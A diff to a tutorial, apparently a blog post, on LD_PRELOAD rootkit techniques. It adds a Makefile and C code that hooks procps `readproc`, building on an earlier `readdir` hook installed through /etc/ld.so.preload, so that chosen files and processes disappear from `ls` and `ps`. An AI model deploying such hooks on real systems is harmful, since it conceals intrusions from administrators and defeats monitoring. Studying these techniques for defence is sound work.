@@ -43,13 +43,9 @@ The `readdir` function returns `NULL` on error or if the directory list is done,
 
 typedef struct dirent* (*readdir_pfn_t)(DIR*);
 
-static
-readdir_pfn_t
-g_original_readdir = NULL;
+static readdir_pfn_t g_original_readdir = NULL;
 
-struct
-dirent*
-readdir(DIR* dirp)
+struct dirent* readdir(DIR* dirp)
 {
     struct dirent* ret = NULL;
 
@@ -126,4 +122,84 @@ Let's iterate:
 - We compile the shared object and then add it to `/etc/ld.so.preload` file, as we described earlier. Note you have to be running as root to do that.
 - We create two files with the `touch` command - one called `example`, the other - `example2`.
 - We run `ls -la` and see those file have bee removed from directory listing!
+
+To make things easier to compile, we can create a simple [Makefile](https://www.gnu.org/software/make/manual/html_node/Introduction.html) - simply running `make` now will make things easier:
+
+```
+CC=gcc
+CFLAGS=-Wall -fPIC -shared -D_GNU_SOURCE
+LDFLAGS=-ldl
+
+all: hider.so
+
+hider.so: hider.o
+	$(CC) $(CFLAGS) hider.o -o hider.so $(LDFLAGS)
+
+clean:
+	rm hider.so hider.o
+```
+
+## Hiding processes
+Let's also remove the `FILENAME_TO_HIDE` from process listing (e.g. in tools like `ps`).  
+Process listing can easily be done by reading the `/proc` filesystem; however, most tools (`ps` included) do not read `procfs` on their own, they instead use a library, and the most well-known library to do that is called [procps](https://gitlab.com/procps-ng/procps).  
+Well, `procps` has a function called `readproc` for process listing - it returns a `proc_t*` which has many, many fields - one of them is `cmdline` which contains the command-line.
+
+So, we can do something very similar, let's export our `readproc` function and skip entries with `FILENAME_TO_HIDE` in their command-line:
+```c
+
+#include <proc/readproc.h>
+
+#define FREEPROC(proc) do                                \
+	               {                                 \
+                           if (NULL != (proc))           \
+			   {                             \
+			       freeproc(proc);           \
+		               (proc) = NULL;            \
+			   }                             \
+		       }                                 \
+                       while (0)
+
+typedef proc_t* (*readproc_pfn_t)(PROCTAB*, proc_t*);
+
+static readproc_pfn_t g_original_readproc = NULL;
+
+proc_t* readproc(PROCTAB* PT, proc_t* return_buf)
+{
+    struct proc_t* ret = NULL;
+
+    // Validate original function exists
+    if (NULL == g_original_readproc)
+    {
+        g_original_readproc = dlsym(RTLD_NEXT, "readproc");
+	if (NULL == g_original_readproc)
+	{
+            goto cleanup;
+	}
+    }
+
+    // Invoke and skip process entries to hide
+    do
+    {
+	// Free previously system-allocated buffers if required
+        if (NULL == return_buf)
+	{
+            FREEPROC(ret);
+	}
+
+        ret = g_original_readproc(PT, return_buf);
+        if (NULL == ret)
+	{
+            goto cleanup;
+	}
+    } while ((ret->cmdline[0] != NULL) && (NULL != strstr(ret->cmdline[0], FILENAME_TO_HIDE)));
+
+cleanup:
+
+    // Return the entry
+    return ret;
+}
+```
+
+This is quite similar. The only difference is that `cmdline` is an array (so we only examine it's first element) and might be `NULL`.  
+Also, calls to `readproc` must use `freeproc` on previous entries if the input buffer (`return_buf`) was `NULL`. I usually define macros to do those things (I defined `FREEPROC`).
 
